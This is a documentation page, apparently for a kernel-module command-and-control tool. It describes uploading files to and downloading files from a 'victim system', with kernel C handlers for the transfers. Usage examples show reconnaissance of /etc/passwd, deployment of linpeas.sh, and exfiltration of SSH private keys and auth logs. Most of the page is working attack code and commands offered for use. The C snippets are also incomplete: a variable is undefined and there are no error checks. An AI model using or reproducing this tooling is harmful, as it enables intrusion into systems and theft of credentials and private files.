---
title: "File Transfer"
description: "Upload and download files between C2 server and victim system"
icon: "download"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 511
---

# File Transfer

Transfer files between the C2 server and victim system using direct content transmission.

## Upload Files

Upload files from C2 server to victim system.

### Usage
```bash
# Upload to specific path
upload Client-1 ./config.txt /etc/myapp/config.txt

# Upload to current directory  
upload Client-1 ./script.sh
```

### Implementation
```c
static int handle_upload(const char *data)
{
    char *filename, *file_content, *separator;
    struct file *file;
    loff_t pos = 0;
    
    // Parse filename:content format
    separator = strchr(data, ':');
    *separator = '\0';
    filename = data;
    file_content = separator + 1;
    
    // Create and write file
    file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    kernel_write(file, file_content, content_length, &pos);
    filp_close(file, NULL);
    
    return send_success("File uploaded successfully");
}
```

## Download Files

Download files from victim system to C2 server.

### Usage
```bash
# Download to specific path
download Client-1 /etc/passwd ./victim_passwd

# Download to current directory
download Client-1 /etc/hostname
```

### Implementation
```c
static int handle_download(const char *data)
{
    struct file *file;
    loff_t file_size, pos = 0;
    char *file_content;
    
    // Open and read file
    file = filp_open(data, O_RDONLY, 0);
    file_size = i_size_read(file_inode(file));
    
    file_content = vmalloc(file_size + 1);
    kernel_read(file, file_content, file_size, &pos);
    filp_close(file, NULL);
    
    return send_result(file_content);
}
```

## WebUI Interface

### Upload Panel
- **File Selection**: Choose local file to upload
- **Remote Path**: Specify destination path on victim
- **Progress**: Real-time upload progress indicator

### Download Panel  
- **File Browser**: Navigate victim filesystem
- **Quick Downloads**: Common system files (passwd, hosts, etc.)
- **Batch Download**: Select multiple files

## Security Features

- **Path Validation**: Prevents directory traversal attacks
- **File Size Limits**: 10MB maximum transfer size
- **Permission Control**: Files created with safe permissions (0644)
- **Error Handling**: Graceful failure on permission/space issues

## Common Examples

```bash
# System reconnaissance
download Client-1 /etc/passwd
download Client-1 /etc/hosts
download Client-1 /proc/version

# Deploy tools
upload Client-1 ./linpeas.sh /tmp/enum.sh
exec Client-1 chmod +x /tmp/enum.sh

# Exfiltrate data
download Client-1 /home/user/.ssh/id_rsa
download Client-1 /var/log/auth.log
```